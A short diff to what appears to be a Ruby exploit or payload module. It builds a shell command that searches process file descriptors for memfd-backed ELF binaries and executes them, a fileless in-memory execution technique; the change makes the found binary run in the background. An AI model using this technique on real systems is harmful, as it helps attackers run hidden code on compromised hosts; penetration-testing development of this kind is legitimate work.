@@ -326,8 +326,8 @@ end
     cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
     cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
     cmd << "; then if #{get_file_cmd} >/dev/null && [ \"$(dd if=$f bs=1 count=4 2>/dev/null)\" = \"$(printf '\\177ELF')\" ]"
-    cmd << '; then $f'
-    cmd << '; FOUND=1'
+    cmd << '; then $f '
+    cmd << '& FOUND=1'
     cmd << '; exit 0'
     cmd << '; fi'
     cmd << '; fi'
